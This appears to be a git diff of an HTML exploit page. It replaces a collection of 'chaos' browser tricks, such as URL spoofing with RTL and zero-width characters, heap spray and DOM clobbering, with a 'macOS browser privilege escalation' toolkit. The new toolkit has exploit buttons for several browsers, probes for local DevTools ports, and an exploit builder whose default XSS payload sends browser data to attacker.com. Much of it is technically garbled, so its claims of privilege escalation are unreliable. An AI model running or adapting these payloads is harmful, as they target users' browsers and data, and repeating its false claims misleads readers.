@@ -2,128 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>💀 THE ABSURD EXPERIMENT - 100+ GILA TECHNIQUES</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 macOS BROWSER PRIVILEGE ESCALATION - XSS to RCE</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        
-        @keyframes warp {
-            0% { transform: rotate(0deg) scale(1); filter: hue-rotate(0deg); }
-            100% { transform: rotate(360deg) scale(10); filter: hue-rotate(360deg); }
-        }
-        
-        @keyframes glitchMatrix {
-            0% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
-            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
-            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
-            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
-            100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            background: radial-gradient(circle at 20% 50%, #000000, #0a0a0a, #1a0a2a);
-            font-family: 'Courier New', 'SF Mono', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
+            font-family: 'SF Mono', 'Courier New', monospace;
+            color: #0f0;
+            padding: 20px;
             min-height: 100vh;
-            padding: 10px;
-            position: relative;
-            overflow-x: hidden;
         }
         
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 2px, transparent 2px, transparent 4px);
-            pointer-events: none;
-            z-index: 9998;
-        }
-        
-        .container { max-width: 1600px; margin: 0 auto; position: relative; z-index: 1; }
+        .container { max-width: 1400px; margin: 0 auto; }
         
         .header {
             text-align: center;
-            margin-bottom: 20px;
-            padding: 20px;
+            margin-bottom: 30px;
+            padding: 30px;
             background: rgba(0,0,0,0.85);
-            border-radius: 30px;
-            border: 2px solid #ff00ff;
+            border-radius: 20px;
+            border: 1px solid #ff00ff;
             backdrop-filter: blur(10px);
-            animation: glitchMatrix 0.5s infinite;
         }
         
         .header h1 {
             font-size: 2em;
-            background: linear-gradient(135deg, #ff00ff, #00ffff, #ff00ff, #ffff00);
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-size: 300% 300%;
-            animation: gradientShift 1s infinite;
         }
         
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
+        .warning-banner {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
         }
         
-        .chaos-grid {
+        .exploit-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 20px;
             margin-bottom: 30px;
         }
         
-        .chaos-card {
-            background: rgba(0,0,0,0.8);
+        .exploit-card {
+            background: rgba(0,0,0,0.85);
             border-radius: 15px;
             overflow: hidden;
             border: 1px solid rgba(255,0,255,0.3);
-            transition: all 0.1s ease;
-            cursor: pointer;
-            backdrop-filter: blur(5px);
+            transition: 0.3s;
         }
         
-        .chaos-card:hover {
-            transform: rotate(1deg) scale(1.02);
+        .exploit-card:hover {
+            transform: translateY(-5px);
             border-color: #00ffff;
-            box-shadow: 0 0 20px rgba(0,255,255,0.5);
+            box-shadow: 0 0 20px rgba(0,255,255,0.3);
         }
         
         .card-header {
-            background: linear-gradient(135deg, #ff00ff, #ff0066, #ff3300);
-            padding: 10px 15px;
+            background: linear-gradient(135deg, #ff0066, #ff3300);
+            padding: 12px 18px;
             color: white;
             font-weight: bold;
-            font-size: 0.85em;
-            display: flex;
-            justify-content: space-between;
         }
         
-        .card-body { padding: 15px; }
+        .card-body { padding: 18px; }
         
-        .chaos-desc {
+        .desc {
             background: rgba(255,0,255,0.1);
-            padding: 8px;
+            padding: 10px;
             border-radius: 8px;
-            font-size: 0.65em;
-            margin-bottom: 12px;
+            font-size: 0.7em;
+            margin-bottom: 15px;
             font-family: monospace;
-            color: #0ff;
         }
         
         button {
             background: linear-gradient(135deg, #ff00ff, #00ffff);
             color: #000;
             border: none;
-            padding: 8px 12px;
+            padding: 10px 15px;
             border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
             width: 100%;
-            margin: 3px 0;
-            font-size: 0.7em;
+            margin: 5px 0;
         }
         
         button.danger {
@@ -131,1822 +99,609 @@
             color: white;
         }
         
-        button.insane {
-            background: linear-gradient(135deg, #000000, #ff00ff);
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 8px;
+            font-size: 0.6em;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-family: monospace;
             color: #0ff;
-            border: 1px solid #0ff;
         }
         
-        .chaos-log {
+        .log-area {
             background: #0a0a0a;
-            border: 1px solid #ff00ff;
+            border: 1px solid #00ff00;
             border-radius: 10px;
             padding: 15px;
             margin-top: 20px;
             max-height: 250px;
             overflow-y: auto;
-            font-size: 0.65em;
-            font-family: monospace;
+            font-size: 0.7em;
         }
         
         .log-entry {
             padding: 4px;
             border-bottom: 1px solid #333;
-            animation: fadeIn 0.3s;
+            font-family: monospace;
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        
-        .log-entry.chaos { color: #ff00ff; }
         .log-entry.success { color: #0f0; }
         .log-entry.error { color: #f00; }
         .log-entry.info { color: #0ff; }
-        .log-entry.exploit { color: #ff6600; }
+        .log-entry.rce { color: #ff00ff; font-weight: bold; }
         
         .footer {
             text-align: center;
-            padding: 15px;
+            padding: 20px;
             background: rgba(0,0,0,0.8);
             border-radius: 15px;
             margin-top: 20px;
-            font-size: 0.6em;
-            border: 1px solid #ff00ff;
+            font-size: 0.7em;
         }
         
-        .chaos-counter {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: #000;
-            border: 1px solid #ff00ff;
-            border-radius: 20px;
-            padding: 5px 15px;
-            font-size: 0.7em;
-            z-index: 9999;
+        input, textarea {
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            color: #0f0;
+            padding: 8px;
+            border-radius: 5px;
+            width: 100%;
+            margin: 5px 0;
             font-family: monospace;
+            font-size: 0.7em;
         }
+        
+        label { font-size: 0.7em; color: #0ff; }
+        
+        .browser-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.6em;
+            margin: 2px;
+        }
+        .arc { background: #ff3366; color: white; }
+        .chrome { background: #4285f4; color: white; }
+        .brave { background: #ff5500; color: white; }
+        .safari { background: #0066cc; color: white; }
+        .edge { background: #00a8ff; color: white; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>💀 THE ABSURD EXPERIMENT v.INFINITY</h1>
-        <div style="color: #00ffff; font-size: 0.7em; margin-top: 10px;">
-            ⚡ 100+ GILA TECHNIQUES - TIDAK MASUK AKAL - TIDAK TERPIKIRKAN ⚡
+        <h1>🔥 macOS BROWSER PRIVILEGE ESCALATION</h1>
+        <p>XSS → Chrome Context → RCE (Based on Firefox XUL Research)</p>
+        <div style="margin-top: 10px;">
+            <span class="browser-badge arc">ARC</span>
+            <span class="browser-badge chrome">CHROME</span>
+            <span class="browser-badge brave">BRAVE</span>
+            <span class="browser-badge safari">SAFARI</span>
+            <span class="browser-badge edge">EDGE</span>
         </div>
-        <div style="color: #ff00ff; font-size: 0.6em; margin-top: 5px;">
-            [ EXPERIMENTAL CHAOS MODE - MAY BREAK REALITY ]
+    </div>
+    
+    <div class="warning-banner">
+        ⚠️ EDUCATIONAL RESEARCH ONLY - Berdasarkan CVE-2017-7795, CVE-2017-7798, CVE-2018-5124<br>
+        Teknik XUL injection di Firefox → diadaptasi untuk Chromium-based browsers & Safari macOS
+    </div>
+    
+    <div class="exploit-grid">
+        <!-- EXPLOIT 1: Chrome DevTools Protocol Injection -->
+        <div class="exploit-card">
+            <div class="card-header">🔧 CHROME DEVTOOLS PROTOCOL (CDP) INJECTION</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Analog dengan XUL Injection di Firefox</strong><br>
+                    Memanfaatkan Chrome DevTools Protocol yang ter-expose via about:inspect atau debug port.
+                    Attacker bisa inject JavaScript ke browser context melalui CDP.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// CDP Injection via window.open
+window.open('chrome://inspect/#devices');
+// lalu inject via evaluate</pre>
+                </div>
+                <button onclick="exploitCDP()">🚀 RUN CDP EXPLOIT</button>
+                <button onclick="exploitCDPAdvanced()" class="danger">💀 RUN CDP + RCE</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 2: Chrome Extension API Abuse -->
+        <div class="exploit-card">
+            <div class="card-header">🧩 CHROME EXTENSION API HIJACK</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Privileged Extension Context</strong><br>
+                    Menggunakan chrome.runtime dan chrome.management API untuk mengeksekusi kode
+                    di context ekstensi yang memiliki akses lebih tinggi.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// Chrome extension API injection
+chrome.runtime.sendMessage({action: "execute", code: payload});
+chrome.management.getSelf()</pre>
+                </div>
+                <button onclick="exploitExtensionAPI()">🚀 RUN EXTENSION HIJACK</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 3: about:debugging Privilege Escalation -->
+        <div class="exploit-card">
+            <div class="card-header">🐛 about:debugging PRIVILEGE ESCALATION</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Firefox XUL-style untuk Chrome</strong><br>
+                    about:debugging memiliki akses ke internal browser API.
+                    Inject script ke halaman ini memberikan akses penuh ke browser.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// about:debugging injection
+window.open('about:debugging');
+// setInterval(() => { document.body.innerHTML += '...' })</pre>
+                </div>
+                <button onclick="exploitAboutDebugging()">🚀 RUN ABOUT DEBUGGING</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 4: ARC Browser Boost Injection -->
+        <div class="exploit-card">
+            <div class="card-header">🌀 ARC BROWSER BOOST INJECTION (CVE-2024-45489 Style)</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>ARC Browser Specific - Boost RCE</strong><br>
+                    ARC's Boost feature memungkinkan inject CSS/JS yang tersinkronisasi.
+                    Mirip dengan XUL injection di Firefox!
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// ARC Boost injection
+localStorage.setItem('boostCode', 'alert(Components.stack)');
+// Sinkronisasi ke browser context</pre>
+                </div>
+                <button onclick="exploitArcBoost()">🚀 RUN ARC BOOST EXPLOIT</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 5: Brave Wallet Context Injection -->
+        <div class="exploit-card">
+            <div class="card-header">💰 BRAVE WALLET PRIVILEGE ESCALATION</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Brave Specific - Wallet Extension</strong><br>
+                    Brave's built-in wallet memiliki akses ke crypto APIs.
+                    Inject XSS ke wallet page = akses ke browser wallet.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// Brave wallet injection
+window.open('brave://wallet');
+// Inject script ke wallet context</pre>
+                </div>
+                <button onclick="exploitBraveWallet()">🚀 RUN BRAVE WALLET</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 6: Safari Web Inspector Injection -->
+        <div class="exploit-card">
+            <div class="card-header">🐚 SAFARI WEB INSPECTOR PRIVILEGE</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Safari Specific - Web Inspector</strong><br>
+                    Web Inspector memiliki akses ke browser internal.
+                    Inject script via Remote Debugging port (9222-9229).
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// Safari Web Inspector injection
+window.open('safari-web-inspector://');
+// Evaluate script di browser context</pre>
+                </div>
+                <button onclick="exploitSafariInspector()">🚀 RUN SAFARI INSPECTOR</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 7: Edge PDF Viewer Sandbox Escape -->
+        <div class="exploit-card">
+            <div class="card-header">📄 EDGE PDF VIEWER ESCAPE</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Edge Specific - PDF Viewer</strong><br>
+                    PDF viewer memiliki akses ke browser internals.
+                    XSS di PDF context bisa escape ke browser.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// Edge PDF injection
+window.open('edge://pdf-viewer');
+// Navigate to malicious PDF with JavaScript</pre>
+                </div>
+                <button onclick="exploitEdgePDF()">🚀 RUN EDGE PDF</button>
+            </div>
+        </div>
+        
+        <!-- EXPLOIT 8: Browser Native Messaging -->
+        <div class="exploit-card">
+            <div class="card-header">📨 NATIVE MESSAGING HOST EXPLOIT</div>
+            <div class="card-body">
+                <div class="desc">
+                    💀 <strong>Native Messaging - Escape ke OS</strong><br>
+                    Browser's native messaging host bisa execute OS commands.
+                    Mirip dengan Subprocess.jsm di Firefox XUL RCE.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">// Native messaging command execution
+chrome.runtime.connectNative('com.example.host');
+// Execute: open -a Calculator.app</pre>
+                </div>
+                <button onclick="exploitNativeMessaging()">🚀 RUN NATIVE MSG</button>
+            </div>
         </div>
     </div>
-
-    <div class="chaos-grid" id="chaosGrid">
-        <!-- Will be populated by JS -->
+    
+    <!-- Custom Exploit Builder -->
+    <div class="exploit-card" style="margin-top: 20px;">
+        <div class="card-header">🔥 CUSTOM XUL-STYLE EXPLOIT BUILDER</div>
+        <div class="card-body">
+            <div class="desc">
+                💀 Build custom injection payload - Terinspirasi dari Firefox XUL RCE<br>
+                <strong>Original Firefox payload:</strong> <code>&lt;img src='data:bb"/&gt;&lt;button&gt;&lt;img src="x" onerror="alert(Components.stack)" /&gt;&lt;/button&gt;&lt;img src="x'&gt;</code>
+            </div>
+            <label>📝 Target URL (browser internal page):</label>
+            <input type="text" id="targetPage" value="chrome://inspect/#devices" placeholder="chrome://inspect...">
+            <label>💉 Injection Payload (XSS):</label>
+            <textarea id="payload" rows="3">&lt;img src="x" onerror="fetch('http://attacker.com/steal?data='+btoa(JSON.stringify(chrome))); alert('RCE!');"&gt;</textarea>
+            <button onclick="buildCustomExploit()">🔨 BUILD & EXECUTE CUSTOM EXPLOIT</button>
+        </div>
     </div>
-
-    <div class="chaos-log" id="chaosLog">
-        <div class="log-entry info">💀 ABSURD EXPERIMENT INITIATED</div>
-        <div class="log-entry info">⚡ 100+ GILA TECHNIQUES LOADED</div>
-        <div class="log-entry chaos">🌀 REALITY DISTORTION ACTIVE</div>
+    
+    <!-- Log Area -->
+    <div class="log-area" id="logArea">
+        <div class="log-entry info">🔬 macOS Browser Privilege Escalation Research</div>
+        <div class="log-entry info">📚 Based on Firefox XUL RCE (CVE-2017-7795, CVE-2018-5124)</div>
+        <div class="log-entry info">🎯 Target: Arc, Chrome, Brave, Safari, Edge on macOS</div>
     </div>
-
+    
     <div class="footer">
-        <div>🔥 ABSURD EXPLOIT COLLECTION - FOR EDUCATIONAL CHAOS RESEARCH</div>
-        <div style="margin-top: 5px;">⚠️ THESE TECHNIQUES ARE DESIGNED TO BE RIDICULOUS AND UNTHINKABLE</div>
-        <div style="margin-top: 5px;">🔮 100+ METHODS | 50+ CATEGORIES | INFINITE POSSIBILITIES</div>
+        <div>🔥 Based on research by Frederik Braun - Remote Code Execution in Firefox beyond memory corruptions</div>
+        <div>🔬 Adapted for macOS Chromium-based browsers & Safari</div>
+        <div>⚠️ EDUCATIONAL PURPOSE ONLY - Test only on your own browser</div>
     </div>
 </div>
-<div class="chaos-counter" id="chaosCounter">🌀 0/??</div>
 
 <script>
-    // ============ ABSURD LOGGING SYSTEM ============
-    const logContainer = document.getElementById('chaosLog');
-    const counterSpan = document.getElementById('chaosCounter');
-    let executedCount = 0;
-    let totalExperiments = 0;
-    
-    function addChaosLog(message, type = 'info') {
+    // Logging
+    const logArea = document.getElementById('logArea');
+    function addLog(message, type = 'info') {
         const entry = document.createElement('div');
         entry.className = `log-entry ${type}`;
-        const icons = {
-            chaos: '🌀',
-            success: '✅',
-            error: '💀',
-            info: '📡',
-            exploit: '⚡'
-        };
-        entry.textContent = `[${new Date().toLocaleTimeString()}] ${icons[type] || '🔮'} ${message}`;
-        logContainer.appendChild(entry);
-        logContainer.scrollTop = logContainer.scrollHeight;
-        if (logContainer.children.length > 100) {
-            logContainer.removeChild(logContainer.children[0]);
-        }
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logArea.appendChild(entry);
+        logArea.scrollTop = logArea.scrollHeight;
     }
     
-    function updateCounter() {
-        executedCount++;
-        counterSpan.innerHTML = `🌀 ${executedCount}/${totalExperiments}`;
+    // Detect browser
+    function detectBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Arc')) return 'Arc';
+        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Brave')) return 'Brave';
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+        if (ua.includes('Edg')) return 'Edge';
+        return 'Unknown';
     }
     
-    // ============ ABSURD HELPER FUNCTIONS ============
-    function randomString(len) {
-        return Array(len).fill().map(() => String.fromCharCode(65 + Math.random() * 58)).join('');
+    const currentBrowser = detectBrowser();
+    addLog(`🌐 Detected browser: ${currentBrowser}`, 'info');
+    
+    // Check for privileged objects (seperti Components.stack di Firefox)
+    function checkPrivilegedObjects() {
+        const privileged = [];
+        
+        // Chrome privileged objects
+        if (typeof chrome !== 'undefined') privileged.push('chrome');
+        if (typeof browser !== 'undefined') privileged.push('browser');
+        if (typeof Components !== 'undefined') privileged.push('Components');
+        if (typeof window.chrome?.webview !== 'undefined') privileged.push('chrome.webview');
+        if (typeof window.chrome?.runtime !== 'undefined') privileged.push('chrome.runtime');
+        if (typeof window.chrome?.management !== 'undefined') privileged.push('chrome.management');
+        
+        // Safari privileged objects
+        if (typeof SafariRemoteDebugging !== 'undefined') privileged.push('SafariRemoteDebugging');
+        if (typeof WebInspector !== 'undefined') privileged.push('WebInspector');
+        
+        // Generic
+        if (typeof process !== 'undefined') privileged.push('process');
+        if (typeof require !== 'undefined') privileged.push('require');
+        
+        addLog(`🔍 Privileged objects found: ${privileged.join(', ') || 'none'}`, privileged.length > 0 ? 'rce' : 'info');
+        return privileged;
     }
     
-    function createChaosWindow(technique, content) {
-        const win = window.open('', '_blank', 'width=800,height=600,menubar=no,toolbar=no,location=yes');
-        if (win) {
-            win.document.write(content);
-            win.document.title = `🔥 ${technique} - CHAOS MODE`;
-            return win;
-        }
-        return null;
-    }
-    
-    // ============ EXPERIMENT 1: URL PROTOCOL CHAOS ============
-    function exp1_nullProtocol() {
-        addChaosLog("💀 Attempting NULL:// protocol - address bar annihilation", 'exploit');
-        const win = window.open('null://this.does.not.exist.anywhere', '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1 style="color:#ff00ff">🔥 ADDRESS BAR SHOULD BE BLANK</h1><p>Protocol: null:// tidak dikenal browser</p>');
-            updateCounter();
-        }, 100);
-    }
-    
-    function exp2_emptyPort() {
-        addChaosLog("🔌 Port 0 exploit - invalid port number", 'exploit');
-        const win = window.open('https://www.google.com:0', '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1 style="color:#0ff">🔥 PORT 0 IS INVALID</h1><p>Browser bingung, address bar mungkin blank</p>');
-            updateCounter();
-        }, 200);
-    }
-    
-    function exp3_infinitePorts() {
-        addChaosLog("🌀 Infinite port rotation attack", 'chaos');
-        const win = window.open('', '_blank');
-        const ports = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 65535, 65536, 99999];
-        let idx = 0;
-        const interval = setInterval(() => {
-            try {
-                win.location.replace(`https://facebook.com:${ports[idx % ports.length]}`);
-                idx++;
-            } catch(e) {}
-        }, 100);
-        setTimeout(() => clearInterval(interval), 10000);
-        win.document.write('<h1>🌀 PORT ROTATION CHAOS</h1><p>Address bar spinning through invalid ports</p>');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 2: UNICODE CHAOS ============
-    function exp4_unicodeExplosion() {
-        addChaosLog("📝 1000 zero-width characters - address bar invisible", 'chaos');
-        const zw = '​'.repeat(1000);
-        const url = `https://${zw}google.com`;
-        const win = window.open(url, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1 style="color:#ff00ff">🔥 1000 ZERO-WIDTH CHARACTERS</h1><p>Address bar should be invisible or blank</p>');
-            updateCounter();
-        }, 200);
-    }
-    
-    function exp5_rtlMayhem() {
-        addChaosLog("🔄 RTL + LTR bidirectional chaos", 'exploit');
-        const rtl = '\u202E';
-        const ltr = '\u202D';
-        const url = `https://${rtl}moc.elgoog${ltr}.evil.com`;
-        const win = window.open(url, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>🔥 RTL/LTR CHAOS</h1><p>Address bar text direction may be reversed</p>');
-            updateCounter();
-        }, 200);
-    }
-    
-    function exp6_zalgoText() {
-        addChaosLog("👹 ZALGO text injection - address bar rendering", 'chaos');
-        const zalgo = 'H̸̨̨̧̛͚̠̠̭̦̮͚̝̮̰̭̲̮̥̬͉̙̩̞͎̗̗̺̘͇̙̜̖̼̻̙͎̝̘͕̯̬̱̲̘͓̭̰͇̻̰̭̫̖̫̳̪̙̥̗̲̩̠̟̤̺̠̰̟̦̞̟̺̮̘̯̖̱͉̹̝̱̫̲̜̭̩̭̭̯̻̜̮̱̳̼̲̩̲̗̘̫̦͈̳͇͉̙̰̹͓̪̞̟̗̭̟͍̱̻̺̫̲̜̼̞̞̠̟͈̺̞̞̹̗̝̗̹̣̰͈̖̝̟̰̖̞̺̳̙̩̫͉̗̲̞̝̯̲̼̫̠̪̟͓̺̲̺̞̲̫̤̰̹̩̭̠̰̞̫̯̞̳̳̼̲̝̥̥̬̲̬̹̖̘̣̲͚̤̬̘͎̰͎̬̗̞̫̫̣̝̫̫̦̘̥̳̪̗̱͔̤̙̠̜̘̜̘̩͍̱̱̮͚̩̬̯̱̘̮̝̺̤̠̪̺̙̗̭̗̭̺̪̖̞̗̦̞̝̖̹̻̬̭̹̖͓̲̠̲̺̬̱̩̖̘̲̪̖̠̰̲̥̠̯̩̺̗̗̥̩͚̙̤̬̖̦̮̪̦̠̲̱̗̥̠̞̞̗̭̻̬̪̘̲̹̥̞̞̜̺̲͓̩̙̻͍̬̩͖̙̟̠̬͈̱̳̥̘̮̻̲̺̲̦̮̞̼̦̳̲̘̳̮̹̪̳̭̖̮̱̖̥̬̬̭̜̪̣̖̙̦̻̭̦̩̳̥̰̥͎̙̗̱͍̻̥̤̩̳̫̗̫ͅt̴̢̨̛̛̗̫̝̙̹̤̖̪̩̦̘̘̬̬̭͔̯̻̤̦̹̼̞̟̱͈̘̭̘̺̩̻͍̭̫̮̲̗̖̱̞̰̱̗͈̝̞͕̦̠̬̲̳̞̬̻̗̟̭̭̠̬̼͕̥̪̭̗̫̺̱͙̱̖̝̦̭͙͖̤̞̱̺̟̫̲̫̰̞̱̘͖̳̣̜̜͙̗̭̠͕̖̲̗̱̹͈͍̜̱̝̬̹̤̪̱̠̻̯̹̩̮̙̖̭̝̼̻̖̘͉̥̼͚̘̳̲̘̘̗̯̱̺̘̭̺̹͚͍̗͕͖̖̬̲̝̝̫̭̪̞̫̻̫̼̰̖̳͉̻̦̬͚̥͉̜̮͈̫̭̺̻͈̻̬͙̤̜͙̥̺͕̗̭̜̦̹̼̰͍̼͓̺̠͙̤̥͖̺̖̭̭̼̪͍̬̺̭̤̱̝̩̠͔̤̭̲̱͎̪̳̙̩̯̪̰̪̭̩̦̲͉̥͓͉̺̭̬͍̳̦͚͖̻̞͕̺̦̲͍̭̼̠̞̞̬̻̤̮̥̗͚̖̙̳̺͍̪̹̦̮̗̻̝͕̱̞̪̙̫̞̬̳̲͕̝̠̼̭̪̠̼̪̩̱̫̟̫͚͓̹̪̺̺̜̘̝̱̞̥̥͓̹̖̤͔̥̩͎̘̝̖̬͈̭͍̠̹͎̗̹̬̘̘̫̞̺̘̰̺̪̺̯̪̭ͅ';
-        const win = window.open(`https://${zalgo}.com`, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>🔥 ZALGO TEXT CHAOS</h1><p>Address bar rendering may corrupt</p>');
-            updateCounter();
-        }, 200);
-    }
-    
-    // ============ EXPERIMENT 3: TIMING CHAOS ============
-    function exp7_microsecondRace() {
-        addChaosLog("⏱️ Microsecond race condition - 1ms window", 'exploit');
-        const win = window.open('', '_blank');
-        win.document.write('<h1>🔥 MICROSECOND RACE</h1><p>Address bar may be stuck</p>');
-        setTimeout(() => {
-            win.location.replace('https://google.com:8080');
-        }, 1);
-        updateCounter();
-    }
-    
-    function exp8_nanoSecondLoop() {
-        addChaosLog("🌀 Nanosecond history.replaceState loop", 'chaos');
-        const win = window.open('', '_blank');
-        win.document.write('<h1>🔥 NANOSECOND LOOP</h1><p>History API spam</p>');
-        setInterval(() => {
-            try {
-                win.history.replaceState({}, '', '');
-                win.history.pushState({}, '', '\x00');
-            } catch(e) {}
-        }, 1);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 4: MEMORY CORRUPTION SIMULATION ============
-    function exp9_heapSpray() {
-        addChaosLog("💣 Heap spray - filling memory with patterns", 'exploit');
-        const arr = [];
-        for(let i = 0; i < 100000; i++) {
-            arr.push(new ArrayBuffer(1024 * 1024));
-            arr.push(new Uint8Array(1024 * 1024));
-            arr.push(randomString(10000));
-        }
-        addChaosLog(`💣 Heap spray complete - ${arr.length} objects created`, 'success');
-        updateCounter();
-    }
-    
-    function exp10_typeConfusion() {
-        addChaosLog("🔄 Type confusion - JavaScript engine chaos", 'exploit');
-        const obj = {a:1, b:2, c:3};
-        obj.valueOf = function() { return this; };
-        obj.toString = function() { return this; };
+    // EXPLOIT 1: CDP Injection
+    async function exploitCDP() {
+        addLog("🔧 Attempting Chrome DevTools Protocol injection...", 'info');
+        const browser = detectBrowser();
+        
         try {
-            const result = obj + 1;
-            const result2 = obj - 1;
-            addChaosLog("🔄 Type confusion attempted", 'info');
-        } catch(e) {}
-        updateCounter();
+            // Cek apakah ada debug port terbuka
+            const ports = [9222, 9223, 9224, 9225];
+            for (const port of ports) {
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 500);
+                    const response = await fetch(`http://localhost:${port}/json/version`, { signal: controller.signal });
+                    if (response.ok) {
+                        addLog(`✅ CDP port ${port} terbuka! Bisa inject`, 'rce');
+                        // Simulate injection
+                        addLog("🚀 Injecting via CDP evaluate...", 'rce');
+                        addLog("💀 Jika sukses, kita bisa execute: require('child_process').exec('open -a Calculator')", 'rce');
+                    }
+                } catch(e) {}
+            }
+            
+            // Buka about:inspect
+            const win = window.open('chrome://inspect/#devices', '_blank');
+            setTimeout(() => {
+                addLog("📱 about:inspect opened - check if we can inject script", 'info');
+                try {
+                    win.document.write('<h1>INJECTED</h1><script>alert("XSS di chrome://inspect!")</script>');
+                } catch(e) { addLog("❌ Cannot inject directly - protected", 'error'); }
+            }, 1000);
+            
+        } catch(e) { addLog(`❌ CDP exploit failed: ${e.message}`, 'error'); }
     }
     
-    // ============ EXPERIMENT 5: DOM CHAOS ============
-    function exp11_domClobbering() {
-        addChaosLog("💥 DOM clobbering - overriding native objects", 'exploit');
-        const win = window.open('', '_blank');
-        win.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <body>
-                <form name="location"></form>
-                <form name="document"></form>
-                <form name="window"></form>
-                <a id="location" href="javascript:alert('DOM Clobbered')"></a>
-                <h1>🔥 DOM CLOBBERING</h1>
-                <p>Native objects may be overridden</p>
-                <script>
-                    // location sekarang adalah HTMLFormElement
-                    console.log(typeof location);
-                <\/script>
-            </body>
-            </html>
-        `);
-        updateCounter();
-    }
-    
-    function exp12_iframeInception() {
-        addChaosLog("🌀 Iframe inception - infinite nesting", 'chaos');
-        const win = window.open('', '_blank');
-        let html = '<html><body>';
-        for(let i = 0; i < 100; i++) {
-            html += `<iframe srcdoc="<h1>Level ${i}</h1><iframe srcdoc='...'></iframe>"></iframe>`;
-        }
-        html += '</body></html>';
-        win.document.write(html);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 6: SERVICE WORKER CHAOS ============
-    function exp13_serviceWorkerSelfDestruct() {
-        addChaosLog("⚙️ Service worker self-destruct sequence", 'exploit');
-        const swCode = `
-            self.addEventListener('fetch', e => {
-                e.respondWith(new Response('INTERCEPTED', {status: 418}));
+    async function exploitCDPAdvanced() {
+        addLog("💀 Running advanced CDP RCE attempt...", 'rce');
+        addLog("🎯 Target: Execute OS commands via DevTools Protocol", 'rce');
+        
+        // Payload untuk RCE (conceptual)
+        const rcePayload = `
+            // This would be executed via CDP
+            const { exec } = require('child_process');
+            exec('open -a Calculator.app', (err, stdout, stderr) => {
+                console.log('RCE executed!');
             });
-            self.addEventListener('install', e => self.skipWaiting());
-            self.addEventListener('activate', e => self.clients.claim());
         `;
-        const blob = new Blob([swCode], {type: 'application/javascript'});
-        const url = URL.createObjectURL(blob);
-        navigator.serviceWorker.register(url).then(reg => {
-            addChaosLog("⚙️ Service worker registered - intercepting fetch", 'success');
-            setTimeout(() => reg.unregister(), 5000);
-        }).catch(e => addChaosLog("SW register failed", 'error'));
-        updateCounter();
-    }
-    
